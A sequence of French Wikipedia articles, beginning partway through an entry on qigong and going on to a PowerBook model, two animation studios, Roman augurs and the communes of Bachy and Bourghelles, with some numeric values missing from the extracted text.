Le terme peut être connu sous d'autres transcriptions, "chi kung" (école anglo-saxonne Wade), "ki kong" (école française EFEO), "kiko" (adaptation phonétique du japonais), "kygung" (marque déposée utilisée par l'ISMA), mais "qi gong", transcription pinyin du terme, est la version désormais dans les langues européennes.
"Qi gong" est le terme mandarin chinois et romanisé de deux caractères chinois: Qì () et Gōng (). Son écriture () associe deux notions chinoises au sens vaste : 氣 (qì): la vapeur, le souffle, l'air et 功 (gōng): l'effort, la réalisation ou les résultats.
La transcription habituelle en Français du caractère 氣 par « énergie » est erronée car l'énergie se traduit par 能量 en mandarin (lire la page du Wiktionnaire au sujet de l'origine de ces caractères). Par ailleurs le terme d' « énergie vitale » recouvre une notion corporelle ou un flux .
Dans une perspective plus large, « "qi gong" » signifie « méthode et efficience du souffle » et regroupe des techniques traditionnelles de gymnastique, de respiration, de méditation, de visualisation, de transe, de guérison charismatique et de combat qui proviennent de contextes taoïstes, bouddhiques, néoconfucéens, savants ou populaires.
Origines.
« En faisant que ton souffle corporel (ou "shen qi") et que ton souffle primordial (ou "jing qi") embrassent l'Unité, peux-tu redevenir un enfançon ? » Dàodéjīng 10.
Vers le , selon la légende, Bodhidharma développait le qi gong dans le wu shu de l'école Shaolin plus communément appelé de nos jours Kung-fu Shaolin au monastère Shaolin, en Chine, en s'inspirant des gymnastiques taoïstes de longévité.
Durant la révolution culturelle (), le qi gong est réprimé. Plus tard, de nombreuses écoles surgissent, et une s'en détache par sa notoriété, le Falun Gong.
En 1981, le wu shu kung-fu Shaolin se reconstitue.
Historique du qi gong en Chine.
Genèse du "qigong".
Les racines du Qi gong sont millénaires et indissociables de la tradition taoïste. Le travail sur le souffle et l'énergie interne était déjà pratiqué par les sages de l'Antiquité, aussi existe-t-il des écoles taoïstes, bouddhistes et confucianistes de Qi gong, lesquelles ont grandement influencé le développement de la médecine chinoise traditionnelle. Se transmettant de façon le plus souvent privée et secrète entre maîtres et initiés, la pratique du Qi gong a connu une popularité croissante au , tant au sein de la population chinoise qu'à l'extérieur de la Chine, notamment grâce aux contacts des sociétés occidentales qui s'y intéressent de plus en plus à partir des années 1960.
Le père du "qigong" moderne est Liu Guizhen (1920-1983), un cadre du Parti communiste chinois. Après s'être fait soigner pour un ulcère par un maître qui lui enseigna une méthode de méditation et de contrôle de la respiration en position debout, il fut chargé par ses supérieurs de développer cette technique de maîtrise du souffle, mais débarrassée de ses éléments religieux.
Adoption par le Parti communiste.
Adopté par le régime communiste en 1949, le "qigong" est présenté dans les années 1950 , en opposition à la médecine « bourgeoise » occidentale. En 1953, un sanatorium spécialisé est ouvert à Beidaihe, station balnéaire pour les cadres communistes, où ces derniers sont initiés aux méthodes de relaxation. Dans l'ensemble du pays, 70 centres de pratique du "qigong" sont ouverts y compris les cliniques et les sanatoriums. Liu Guizhen est honoré par Mao Zedong.
Interdiction sous la révolution culturelle.
Puis ces pratiques sont interdites et réprimées comme pratiques féodales et superstitieuses durant la révolution culturelle. Le "qigong" continue cependant à se transmettre clandestinement entre maîtres et disciples.
Réapparition et promotion.
À partir des années 1970, le "qigong" refait surface et se pratique collectivement dans les parcs de Pékin à l'initiative d'une certaine Guo Lin qui estimait avoir guéri son cancer de l'utérus grâce au "qigong". En 1979, cette dernière est encouragée par plusieurs dirigeants qui voient dans le "qigong" un moyen sans frais d'améliorer l'état de santé de la population.
À la fin des années 1970, la popularité de ce nouveau qigong des maîtres charismatiques a reçu un coup de fouet important en Chine grâce à la . 
Au début des années 1980, dans le vide spirituel de l'ère post-Mao, et dans un contexte de détente économique, peu après les premières réformes libérales et la première apparition du chômage, le pays connaît une véritable « fièvre du "qigong" », des millions de Chinois, principalement urbains et âgés, deviennent pratiquants d'une des diverses variétés ou écoles de "qigong", dirigées par des maîtres charismatiques dont beaucoup deviennent des célébrités nationales. Dans des stades, devant des milliers de passionnés, des enseignements payants sont donnés par les maîtres dispensateurs de "qi" et de guérisons miraculeuses, à l'instar du maître Yan Xin, censé émettre un "qi" externe pouvant changer la structure moléculaire d'un échantillon d'eau à deux mille kilomètres de distance. La Société de recherche scientifique sur le qigong de Chine (SRSQC), organisme national qui regroupe les associations de "qigong", est créée par l’État en 1985 pour superviser le mouvement.
Les autorités, qui voient dans le "qigong" une façon de mettre en avant la culture chinoise, participent à sa promotion à travers les Salons de la santé qui lui sont consacrés à Pékin en 1992 et 1993.
Pratiques.
Il existe différentes variantes permettant une pratique régulière :
Parfois y est retrouvé :
Tous les exercices de "qi gong" nécessitent de la patience et une pratique régulière.
Certains pratiquants d'arts martiaux pratiquent leurs arts sans pratiquer le Qi gong en Chine.
Effets présumés.
Le "qi gong" compte plusieurs branches, lesquelles recouvrent des centaines de styles différents : le "qi gong" santé et bien-être (préventif), le "qi gong" martial, le "qi gong" médical (curatif), le "qi gong" sexuel et le "qi gong" spirituel.
Les effets allégués d'une pratique régulière du "qi gong" vont de l'augmentation de la capacité de prévention et de guérison des maladies et des blessures, au maintien d'une bonne santé, à l'augmentation de la qualité de vie, au développement de soi, à l'augmentation de la longévité, au développement de dons de guérison et d'autoguérison, voire à l'obtention d'une force surhumaine et de pouvoirs surnaturels.

</doc>
<doc id="191980" url="https://fr.wikipedia.org/wiki?curid=191980" title="PowerBook Duo 270c">
PowerBook Duo 270c

Lancé en même temps que le PowerBook Duo 250, le PowerBook Duo 270c intégrait un écran couleur à matrice active (milliers de couleurs). Il utilisait la même batterie longue durée qui lui assurait plus de deux heures d'autonomie. Il intégrait aussi un FPU Motorola 68882 et un disque dur plus gros (240 Mo contre 200 Mo pour le Duo 250). Ses caractéristiques et son prix ( à sa sortie) en faisait le haut de gamme des ordinateurs ultra-portables de la gamme Apple. 

</doc>
<doc id="191981" url="https://fr.wikipedia.org/wiki?curid=191981" title="Opolskie">
Opolskie



</doc>
<doc id="191982" url="https://fr.wikipedia.org/wiki?curid=191982" title="Grantray-Lawrence Animation">
Grantray-Lawrence Animation

Grantray-Lawrence Animation est un studio d'animation canadien qui a été créé par Grant Simmons, Ray Patterson et Robert Lawrence. Le studio a été en activité de 1954 à 1967.
Grantray-Lawrence Animation a produit de nombreuses séries à petit budget parmi lesquelles "Max the 2000-Year-Old Mouse", "The Marvel Super-Heroes" et le premier dessin animé de "L'Araignée" ("Spider-Man").

</doc>
<doc id="191983" url="https://fr.wikipedia.org/wiki?curid=191983" title="SCUMM">
SCUMM



</doc>
<doc id="191984" url="https://fr.wikipedia.org/wiki?curid=191984" title="Augure">
Augure

L‘augure (du latin "", nom animé) est, dans la religion romaine, un prêtre chargé d'interpréter les phénomènes naturels considérés comme des présages. Les augures étaient les interprètes des volontés de Jupiter, maître des signes ; il était hors de question de partir à la guerre, de choisir l'emplacement d'un temple, de désigner un homme pour une fonction politique, sans consulter les augures. Par exemple, en 63 av. J.-C., Marcus Calpurnius Bibulus tenta de s'opposer à l'une des actions de Jules César en affirmant que les augures étaient défavorables.
Un « augure » (du latin ', nom de même racine qu’', mais cette fois inanimé) désigne également la pratique divinatoire ("augurium" au sens abstrait) exercée par ces prêtres, et le message (de bon augure ou de mauvais augure) envoyé par les dieux ("augurium" au sens concret) qui doit être élucidé afin de déterminer une conduite à tenir pour satisfaire la volonté des dieux. L'augure, divination qui consistait primitivement dans l'observation du chant et du vol des oiseaux (l'ornithomancie), de la manière dont ils mangeaient ainsi que l'interprétation des phénomènes célestes, tels que la foudre (la brontoscopie), et des prodiges, leur venait de l’"Etrusca disciplina", l'ensemble des pratiques divinatoires étrusques.
Origine.
L'interprétation de leur fonction originelle pâtit de confusions résultant de leur nom et d'un emprunt de leurs procédures à l'Étrurie. Si, selon Cicéron, « les augures ont la charge des auspices », "augur" est issu d'un substantif neutre dont la racine "*augos" (genitif *"augeris"), lié à "augere" « augmenter », exprime à la fois la force ("vegere", "vigor") et l'éveil ("vigil"). Le rapprochement avec le grec "augê" « éclat solaire » indique sa valeur première.
Le collège des Augures.
À Rome, les ministres officiellement préposés à cette divination portaient aussi le nom d'augures. Ces ministres étaient en grande considération.
La science augurale se trouvait contenue dans les livres que les devins étaient obligés d'apprendre ou de consulter. Cette science se réduisait à douze chefs ou articles principaux, conformément aux douze signes du zodiaque.
Interprétations des présages.
S'il s'agissait d'une affaire d'État, l'augure devait être fait par un spécialiste, le tout en présence des magistrats afin de savoir si les dieux étaient ou non favorables à l'entreprise.
Les présages sont lus par les devins. Les devins, pour prendre les présages, se tournaient vers le nord, de manière à avoir l'orient à droite et l'occident à gauche ; si le vol, l'animal ou l'éclair passait à droite de l'observateur ("dexter"), les dieux étaient favorables ; s'il passait à sa gauche ("sinister", qui a donné le mot « sinistre »), les dieux étaient défavorables.
De tous les météores qui servaient à prendre l'augure, les plus importants étaient le tonnerre et les éclairs : s'ils venaient de l'orient, ils étaient réputés heureux ; s'ils passaient du nord à l'ouest, c'était tout le contraire. Les vents étaient aussi des signes de bons ou mauvais présages. Les oiseaux dont on observait avec le plus d'attention le vol et le chant étaient l'aigle, le vautour, le milan, le hibou, le corbeau et la corneille. Pour procéder à cette consultation, l'augure (successeur de l'haruspice étrusque) prenait son "lituus", un bâton recourbé ne présentant aucun nœud, et traçait dans le ciel et, plus tard, sur le sol, le "templum", c'est-à-dire le périmètre sacré à l'intérieur duquel il entrerait en relation avec Jupiter.
Cette opération était l"'inauguratio" ; à l'intérieur de ce périmètre, l'augure traçait ensuite une ligne Nord-Sud et une ligne Est-Ouest ; il se plaçait à leur intersection, tourné vers l'Est, tandis que celui qui le consultait se tournait vers le Sud. L'augure a son épaule et son bras droit entièrement découverts au moment où il « prend les auspices », c'est-à-dire le moment où il observe le vol des oiseaux.
Il y avait deux sortes d'auspices : ceux que l'on sollicitait avec l'augure étaient dits "impetrativa" ; ceux qui s'offraient d'eux-mêmes, "oblaticia". Romulus et Remus, en désaccord sur le lieu de formation de leur ville, guettèrent ainsi les auspices, chacun sur la colline qu'ils avaient choisie. Remus, sur l'Aventin, fut le premier à voir six vautours mais Romulus, peu de temps après, en compta douze. C'est ainsi qu'il sut que le Palatin, qu'il avait choisi, était agréé par les dieux.
Outre le vol et le cri des oiseaux, en particulier des pies, des corbeaux et corneilles, l'augure observait aussi l'appétit des poulets sacrés : qu'ils refusent les grains, et le présage était néfaste ; qu'il le mange avec voracité et le présage était faste ; d'autres augures connus sous le nom d'haruspice (de "haru-spicere", « regarder les entrailles »), observaient les viscères ("exta" en latin) des victimes désignées pour les sacrifices, pratique dénommée « l'haruspicine ». Si le foie, la rate, l'estomac, les poumons, le cœur et les reins présentaient les caractéristiques voulues, les animaux étaient brûlés sur l'autel en offrande aux dieux, sinon, on recommençait le sacrifice.
Afin que le chef d'une armée eût toujours à sa disposition les moyens de consulter les dieux par l'entremise des oiseaux, il se faisait accompagner d'augures portant dans des cages les poulets sacrés. Ces augures appelés pullaires avaient pour unique fonction de nourrir ces volailles, et de les observer à toute heure du jour. On donnait le nom d'haruspices aux ministres chargés spécialement d'examiner les entrailles des victimes pour en tirer des présages. Ils étaient, en général, choisis dans les meilleures familles de Rome, après avoir longtemps été des Étrusques embauchés pour cela, par l’empereur Claude qui avait étudié la langue étrusque, appris à la lire, et qui avait créé un « collège » de 60 haruspices qui exista jusqu’en 408.
Légendes.
Attus Navius.
Cet augure vivait du temps de Tarquin l'Ancien. Il s'opposa au dessein de ce prince qui voulait augmenter le nombre des centuries de chevaliers, prétendant qu'il ne le pouvait sans être autorisé par les augures. Le roi, blessé de cette opposition, et voulant l'humilier, lui proposa de deviner si ce qu'il pensait dans le moment pouvait s'exécuter. -, lui dit Attus Navius après avoir pris les augures.- 
- , répondit l'augure. Sur-le-champ, la chose fut faite et les Romains, frappés d'admiration, érigèrent une statue à Attus Navius.
Durant la première guerre punique, le consul Publius Claudius Appius Pulcher étant sur le point d'engager sur mer une bataille contre la flotte carthaginoise, prit d'abord les auspices. Le pullaire vint lui annoncer que les poulets sacrés refusaient de sortir de leur cage et même de manger. 
Cette parole répétée aux soldats superstitieux abattit leur courage et l'armée subit un désastre.

</doc>
<doc id="191985" url="https://fr.wikipedia.org/wiki?curid=191985" title="Van Beuren Studios">
Van Beuren Studios

Van Beuren Studios est un studio d'animation qui a produit des dessins animés et des documentaires pour le grand écran de 1930 à 1936.
Parmi les séries de Van Beuren, on peut citer "Cubby Bear" et "Tom &amp; Jerry" (série qui a été rebaptisée "Dick &amp; Larry" dans les années 1950 quand MGM a créé ses propres "Tom &amp; Jerry").
Histoire.
En 1920, l'organisation Keith-Albee a fondé Fables Pictures pour la production de la série de dessins animés "Aesop's Film Fables" avec Paul Terry, qui possédait lui-même 10% du studio.  Le producteur Amedee J. Van Beuren a racheté le studio en 1928, conservant Terry et renommant l'entreprise après son nouveau propriétaire. Van Beuren a sorti le premier court métrage d'animation sonore de Terry "Dinner Time" (1928) (un mois avant "Steamboat Willie" de Disney) via Pathé Exchange, qui est devenu plus tard une partie de RKO Pictures. Terry dirigeait le studio d'animation tandis que Van Beuren se concentrait sur d'autres parties de l'entreprise. En 1929, Terry a démissionné pour créer son propre studio Terrytoons et John Foster a repris le département d'animation.
Van Beuren sort ses films via RKO Radio Pictures. Les premiers dessins animés sonores de Van Beuren sont presque identiques aux derniers dessins animés muets : très visuels, avec peu de dialogues et des effets sonores occasionnels. Les chefs d'orchestre Gene Rodemich et Winston Sharples ont supervisé la musique. Les principaux personnages de dessins animés de la société étaient " "Tom et Jerry" ", un duo d'un grand et un petit, généralement des vagabonds qui tentaient diverses occupations. Ils n'ont aucun lien avec les "Tom et Jerry" plus connu de la MGM, le duo de chat et souris et l'ancienne série "Tom et Jerry" de Van Beuren a été rebaptisée "Dick et Larry" dans diverses incarnations futures. Van Beuren était parfaitement conscient que les dessins animés à succès comportaient souvent des "stars" animées et a exhorté son personnel à proposer de nouvelles idées pour les personnages. Cubby, un petit ours espiègle, en est le résultat.
En 1932, Van Beuren prévoyait de sortir une série de courts métrages sur les animaux sauvages avec en vedette le célèbre explorateur Frank Buck . Les dirigeants de RKO ont été tellement impressionnés par ces courts métrages de Van Beuren qu'ils ont décidé de les combiner dans un long métrage, "Seigneurs de la jungle". Ce fut une décision commerciale très réussie, mais elle a laissé à la fois Van Beuren et RKO un vide dans leur programme de courts métrages. Van Beuren, contraint d'agir rapidement, trouve une série existante de comédies à deux rouleaux : les douze productions de Charlie Chaplin pour la Mutual film company, réalisées en 1916-17. Van Beuren a payé 10 000 $ chacun pour les courts métrages et a chargé son département d'animation de créer une nouvelle musique et des effets sonores pour les films muets. Le chef d'orchestre Gene Rodemichet et son assistant et successeur Winston Sharples ont composé les nouvelles partitions. RKO distribue les films de Chaplin en 1933-34. Chaplin n'était pas propriétaire de ces films; l'auteur Michael J. Hayde révèle que Chaplin avait refusé plusieurs opportunités de les acheter.
La Van Beuren Corporation a acquis et produit des longs métrages en prises de vues réelles tels que "Adventure Girl" (1934) et deux autres safaris Frank Buck, "Wild Cargo" (1934) et "Frank Buck's Fang and Claw" (1935). D'autres productions en direct de Van Beuren comprenaient une série de récits de voyage "Van Beuren Vagabond", une série de courts métrages de nouveauté racontés par l'équipe de comédie radio Easy Aces (Goodman Ace et Jane Ace) et des courts métrages de comédie musicale mettant en vedette Bert Lahr, Shemp Howard, entre autres.
Van Beuren est resté insatisfait et a accepté d'autoriser le personnage de bande dessinée populaire "Le Petit Roi" et la série humoristique radiophonique "Amos 'n' Andy" pour les adaptations animées. Aucune des séries n'a été couronnée de succès. Van Beuren a ensuite embauché le réalisateur de Walt Disney Burt Gillett et l'animateur Tom Palmer pour créer une nouvelle série de dessins animés en couleur. Ces dessins animés "Rainbow Parade" mettaient en vedette des personnages établis : Félix le chat, les perroquets de Parrotville , Molly Moo-Cow et la troupe de Toonerville Trolley.
Fermeture.
Les films en couleur de Van Beuren ont été bien accueillis et Van Beuren a finalement réussi à parrainer une série de dessins animés populaires. Cependant, RKO a conclu un accord pour distribuer de nouveaux dessins animés en couleur produits par le leader de l'industrie Walt Disney. RKO, n'ayant plus besoin des dessins animés de Van Beuren, met fin à la série "Rainbow Parade".
Amadee J. Van Beuren est tombé malade pendant cette période. En juillet 1938, il subit un accident vasculaire cérébral qui finira par entraîner sa mort le 12 novembre 1938 par crise cardiaque.
Lors de sa convalescence après son accident vasculaire cérébral, Van Beuren ferma son studio plutôt que d'accepter la syndicalisation qui avait causé les problèmes du studio en 1935. 
Le catalogue du studio Van Beuren a été vendue pour la diffusion à la télévision, les ressorties et de films à domicile dans les années 1940 et 1950, notamment Unity Pictures, Walter Gutlohn/Library Films, Commonwealth Pictures et Official Films. Le catalogue est finalement entré dans le domaine public.

</doc>
<doc id="191986" url="https://fr.wikipedia.org/wiki?curid=191986" title="Bachy">
Bachy

Bachy est une commune française située dans le département du Nord, en région Hauts-de-France.
Géographie.
Description.
Bachy est un bourg périurbain situé à au sud-est de Lille, au sud-ouest de Tournai, au nord-ouest de Valenciennes et au nord-est de Douai. La limite Est de son territoire est constituée par la frontière franco-belge.
Elle est desservie par l'ancienne route nationale 355 (actuelle RD 955) qui la relie à l'agglomération lilloise.
L'altitude de Bachy est de environ. Sa superficie est de . Sa latitude est de 50.554 degrés Nord et sa longitude de 3.26 degrés Est.
Communes limitrophes.
Les villes et villages proches de Bachy sont : Bourghelles (59830) à , Wannehain (59830) à , Cobrieux (59830) à , Cysoing (59830) à , Genech (59242) à .
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par la Bercu et la Gare.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Scarpe aval ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de la Scarpe aval, comprenant la Pévèle, la plaine de la Scarpe et le bassin minier avec l'Ostrevent. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le , puis révisé le . La structure porteuse de l'élaboration et de la mise en œuvre est le parc naturel régional Scarpe-Escaut.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Bachy est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Bachy, une agglomération intra-départementale regroupant trois communes, dont elle est ville-centre. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (84,9 % en 2018), en diminution par rapport à 1990 (89,8 %). La répartition détaillée en 2018 est la suivante : 
terres arables (67,9 %), prairies (11,7 %), zones urbanisées (11,5 %), zones agricoles hétérogènes (5,3 %), forêts (3,5 %), milieux à végétation arbustive et/ou herbacée (0,1 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Habitat et logement.
En 2019, le nombre total de logements dans la commune était de 708, alors qu'il était de 631 en 2014 et de 543 en 2009.
Parmi ces logements, 94,5 % étaient des résidences principales, 0,7 % des résidences secondaires et 4,9 % des logements vacants. Ces logements étaient pour 95,3 % d'entre eux des maisons individuelles et pour 4,4 % des appartements.
Le tableau ci-dessous présente la typologie des logements à Bachy en 2019 en comparaison avec celle du Nord et de la France entière. Une caractéristique marquante du parc de logements est ainsi une proportion de résidences secondaires et logements occasionnels (0,7 %) inférieure à celle du département (1,6 %) mais supérieure à celle de la France entière (9,7 %). Concernant le statut d'occupation de ces logements, 83,7 % des habitants de la commune sont propriétaires de leur logement (82,1 % en 2014), contre 54,7 % pour le Nord et 57,5 pour la France entière.
Voies de communication et transport.
Bachy est desservie par le réseau départemental de bus Arc-en-Ciel-2. La ligne 204 (Mouchin &gt; Cysoing &gt; Villeneuve d'Ascq) dessert la commune aux arrêts Gare, Hôtel, Petit Canard et Poste. Des bus scolaires assurant principalement des liaisons de et vers le lycée Charlotte Perriand (Genech), ou encore l'Institut de Genech desservent aussi Bachy.
Toponymie.
"Baceda" en 1066 (fondation de Saint-Pierre de Lille - Mirœus), "Bacies" en 1159 (titre de Saint-Aubert), "Baissi" en 1221, "Baceda" en 1380 (titre de Saint-Pierre).
D'après Maurits Gysseling, le nom viendrait d'un anthroponyme gallo romain, "Baccius" &gt; "Bacciacum".
Histoire.
Avant la Révolution française.
Avant la Révolution française de 1789, Bachy est le siège d'une seigneurie détenue en 1389 par Gilles de Baudimont dit "Noiseux". Il la transmet en 1417 à Jean de Baudimont. Elle passe ensuite en 1470 à Allard de Calonne.
La seigneurie de Bachy a alors été jointe à un autre fief situé lui aussi sur le village, et appartenant en 1389 à Olivier de Cuinghien, seigneur de Fresne, le tenant de sa femme Jeanne de Forest, dame d'Hem, fille d'Allard de Hem. En 1417, leur fils Gérard de Cuinghien épouse Jeanne de Hingettes, dame des Obeaux à Bondues et de Lomme. Ils ont quatre fils dont Philippe de Cuighien, écuyer, seigneur des deux fiefs réunis, et donc seigneur de Bachy en 1502, marié à Bonne de Wailly, les deux étant enterrés dans l'église de Bachy.
Leur fille, Antoinette de Cuinghien épouse Antoine de Tenremonde (Famille de Tenremonde), écuyer, seigneur de Mérignies.
Bachy reste dans la famille de Tenremonde jusqu'en 1685. À cette date, Marie-Jeanne de Tenremonde en hérite à la mort de son père Louis. Elle épouse Pierre de Haudion. Leur fils Nicolas-Alexandre-Antoine, baron de Haudion n'a pas d'enfants. Il lègue par testament la seigneurie de Bachy à Louis-Philippe-Marie de Palmes, comte d'Espaing, fait comte par lettres patentes données à Versailles en mai 1771, capitaine aux gardes françaises qui devient maréchal de camp. Il assiste, en tant que seigneur de Bachy, à l'assemblée des trois ordres réunis à Lille le , en vue des États généraux de 1789.
Époque contemporaine.
Bachy disposait depuis 1883 d'une gare ferroviaire commune avec la ville voisine de Mouchin, terminus de la ligne française ligne de Pont-de-la-Deûle à Bachy-Mouchin, qui continuait ensuite en Belgique vers Tournai sous le nom de ligne 88A. La section de Nomain - Ouvignies à Bachy - Mouchin a été déclassée en 1960.
Entre 1896 et 1932, Bachy est desservie par le tramway à vapeur des Chemins de fer économiques du Nord qui circule est en accotement de la nationale 355 sur la ligne de Saint-Amand à Hellemmes, longue de .
Politique et administration.
Rattachements administratifs et électoraux.
Rattachements administratifs.
La commune se trouve dans l'arrondissement de Lille du département du Nord.
Elle faisait partie depuis 1818 du canton de Cysoing. Dans le cadre du redécoupage cantonal de 2014 en France, cette circonscription administrative territoriale a disparu, et le canton n'est plus qu'une circonscription électorale.
Rattachements électoraux.
Pour les élections départementales, la commune fait partie depuis 2014 du canton de Templeuve-en-Pévèle
Pour l'élection des députés, elle fait partie de la sixième circonscription du Nord.
Intercommunalité.
Penvénan était membre de la communauté de communes du Pays de Pévèle, un établissement public de coopération intercommunale (EPCI) à fiscalité propre créé fin 1993 et auquel la commune avait transféré un certain nombre de ses compétences, dans les conditions déterminées par le code général des collectivités territoriales.
Conformément aux prescriptions de la loi de réforme des collectivités territoriales du 16 décembre 2010, qui a prévu le renforcement et la simplification des intercommunalités et la constitution de structures intercommunales de grande taille, cette intercommunalité a fusionné avec sa voisine pour former, le , la communauté de communes Pévèle Carembault dont est désormais membre la commune.
Liste des maires.
1881 : Quique.
Instances de démocratie participative.
La commune s'est dotée d'un conseil municipal des jeunes
Équipements et services publics.
Enseignement.
Bachy relève de l'académie de Lille.
Les enfants de la commune sont scolarisés à l'école publique Jacques Brel ou aux écoles privées Saint Jean-Baptiste et du Sacré Cœur.
Justice, sécurité, secours et défense.
La commune relève du tribunal judiciaire de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Les habitants de Bachy se nomment les Bachynois et les Bachynoises.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 36,8 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 22,1 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,72 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191987" url="https://fr.wikipedia.org/wiki?curid=191987" title="Bourghelles">
Bourghelles

Bourghelles est une commune française, située dans le département du Nord en région Hauts-de-France.
Géographie.
Description.
Bourghelles est un bourg périurbain jouxtant Cysoing, proche de la frontière franco-belge et situé à au sud-ouest de Tournai, au nord-ouest de Valenciennes, au nord-est de Lens et au sud-est de Lille.
Il est desservi par l'ancienne route nationale 355 (actuelle RD 955) qui le relie à l'agglomération lilloise.
La chaussée Brunehaut divise le territoire communal entre le Mélantois crayeux et la Pévèle argileuse.
La LGV Nord traverse le territoire communal et se poursuit en Belgique par la LGV 1.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le ruisseau de Cysoing.
Un plan d'eau complète le réseau hydrographique : l'étang la Fontaine ().
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Marque Deûle ». Ce document de planification concerne un territoire de de superficie, délimité par les bassins versants de la Marque et de la Deûle, formant une vaste cuvette sédimentaire de de long et de de large, où la pente est très faible. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est la Métropole européenne de Lille.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Bourghelles est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Cysoing, une agglomération intra-départementale regroupant cinq communes, dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (82,8 % en 2018), en diminution par rapport à 1990 (90,8 %). La répartition détaillée en 2018 est la suivante : 
terres arables (53,5 %), prairies (25,1 %), zones urbanisées (15,2 %), zones agricoles hétérogènes (4,2 %), forêts (2 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Habitat et logement.
En 2019, le nombre total de logements dans la commune était de 676, alors qu'il était de 621 en 2014 et de 570 en 2009.
Parmi ces logements, 93,4 % étaient des résidences principales, 0,1 % des résidences secondaires et 6,4 % des logements vacants. Ces logements étaient pour 96,5 % d'entre eux des maisons individuelles et pour 3,2 % des appartements.
